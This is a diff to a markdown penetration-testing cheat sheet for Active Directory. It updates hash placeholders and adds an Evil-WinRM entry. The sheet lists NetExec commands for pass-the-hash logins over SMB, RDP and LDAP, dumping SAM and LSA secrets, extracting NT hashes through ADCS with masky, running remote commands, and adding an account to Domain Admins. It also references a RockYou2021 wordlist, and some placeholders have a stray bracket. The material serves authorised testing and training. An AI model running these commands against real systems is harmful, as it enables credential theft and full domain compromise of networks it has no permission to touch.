@@ -363,7 +363,7 @@ https://github.com/ohmybahgosh/RockYou2021.txt (91.6 GB)
   <summary> NetExec domain authentication </summary> 
   
   ```bash
-  sudo NetExec smb <Domain_Controller_IP> -u <AD_user> -p <AD_password> -H <hash_NT]> 
+  sudo NetExec smb <Domain_Controller_IP> -u <AD_user> -p <AD_password> -H <hash[LM:NT]> 
   ```
 
 </details> 
@@ -372,7 +372,7 @@ https://github.com/ohmybahgosh/RockYou2021.txt (91.6 GB)
   <summary> NetExec local authentication </summary> 
   
   ```bash
-  NetExec smb <target_IP> -u <username> -H <hash_NT]> --local-auth 
+  NetExec smb <target_IP> -u <username> -H <hash[LM:NT]> --local-auth 
   ```
 
 </details> 
@@ -381,7 +381,7 @@ https://github.com/ohmybahgosh/RockYou2021.txt (91.6 GB)
   <summary> NetExec rdp authentication </summary> 
   
   ```bash
-  NetExec rdp <target_IP> -u <username> -H <hash_NT]> --local-auth 
+  NetExec rdp <target_IP> -u <username> -H <hash[LM:NT]> --local-auth 
   ```
 
 </details> 
@@ -434,16 +434,16 @@ grep -i <keyword> *
   ### Dump NT:hash with masky with domain user
   #### Get ADCS server name
   ```bash
-  sudo NetExec ldap <target_IP> -u <username> -p <password> -H <hash_NT]> -M adcs
+  sudo NetExec ldap <target_IP> -u <username> -p <password> -H <hash[LM:NT]]> -M adcs
   ```
   #### Retrieve the NT hash using PKINIT
   ```bash
-  sudo NetExec ldap <target_IP> -u <username> -p <password> -H <hash_NT]> -M masky -o CA=<'ADCS_server_name'>
+  sudo NetExec ldap <target_IP> -u <username> -p <password> -H <hash[LM:NT]> -M masky -o CA=<'ADCS_server_name'>
   ```
   
   ### Dump SAM with domain user
   ```bash
-  sudo NetExec smb <target_IP> -u <username> -p <password> -H <hash_NT]> --sam
+  sudo NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]]> --sam
   ```
   
    ### Dump LSA with domain user
@@ -457,12 +457,12 @@ grep -i <keyword> *
   
   ### Dump SAM on local computer
   ```bash
-  sudo NetExec smb <target_IP> -u <username> -p <password> -H <hash_NT]> --local-auth --sam
+  sudo NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> --local-auth --sam
   ```
   
    ### Dump LSA on local computer
   ```bash
-  sudo NetExec smb <target_IP> -u <username> -p <password> -H <hash_NT]> --local-auth --lsa
+  sudo NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> --local-auth --lsa
   ```
 </details> 
 
@@ -502,15 +502,26 @@ pypykatz lsa minidump lsass.DMP
   
   #### command
   ```bash
-  NetExec <protocol> <target_IP> -u <username> -p <password> -H <hash_NT]> -x <command>
+  NetExec <protocol> <target_IP> -u <username> -p <password> -H <hash[LM:NT]]> -x <command>
   ```
   #### PowerShell
   ```bash
-  NetExec <protocol> <target_IP> -u <username> -p <password> -H <hash_NT]> -X <command>
+  NetExec <protocol> <target_IP> -u <username> -p <password> -H <hash[LM:NT]> -X <command>
   ```
-  #### Add a new Domain Admin
+</details> 
+
+<details>
+  <summary> Evil-WinRM </summary> 
+  
   ```bash
-  NetExec <protocol> <target_IP> -u <username> -p <password> -H <hash_NT]> -x 'net group "Domain Admins" <username> /add /domain'
+  evil-winrm -i <target_IP> -u <username> -p <password> -H <hash[LM:NT]>
+  ```
+</details> 
+
+<details>
+  <summary> Command to add a new Domain Admin </summary> 
+  ```bash
+  'net group "Domain Admins" <username> /add /domain'
   ```
 </details> 
   
